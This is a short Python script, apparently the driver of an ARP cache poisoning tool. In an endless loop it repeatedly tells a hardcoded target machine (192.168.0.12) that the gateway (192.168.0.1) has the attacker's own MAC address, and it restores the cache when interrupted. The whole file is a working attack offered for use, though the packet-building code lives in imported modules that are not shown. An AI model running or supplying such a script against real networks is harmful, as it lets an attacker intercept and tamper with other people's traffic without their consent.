
from modules.spoof_arp_cache import *
from modules.restore_arp_cache import *
from getmac import get_mac_address as gma
import time

spoof_mac_addr = gma()
gateway_ip_addr = "192.168.0.1"
target_ip_addr = "192.168.0.12" 

try:
	while True:
		spoof_arp_cache(target_ip_addr, gateway_ip_addr, spoof_mac_addr)
		print("Sent ARP Packet")
		time.sleep(2)
except KeyboardInterrupt:
	print("Restoring ARP Cache")
	restore_arp_cache(target_ip_addr, gateway_ip_addr)